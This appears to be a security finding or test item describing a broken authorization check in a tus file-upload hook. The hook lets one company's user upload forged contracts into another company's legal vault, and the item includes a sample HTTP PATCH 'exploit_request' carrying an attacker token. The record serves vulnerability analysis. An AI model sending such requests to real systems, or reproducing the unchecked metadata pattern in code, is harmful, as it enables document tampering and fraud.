diagnosis: The tus onUploadFinish hook trusts companyId and contractId taken directly from upload.metadata without verifying that the uploader's session (req.user) belongs to the specified companyId. An attacker can upload fraudulent contracts or modified agreements directly into another company's legal vault.
exploit_request:
PATCH /tus/contracts/contract_patch_9941 HTTP/1.1
Host: legal.enterpriseregistry.io
Authorization: Bearer <attacker_jwt>
Upload-Offset: 5242880
Content-Type: application/offset+octet-stream
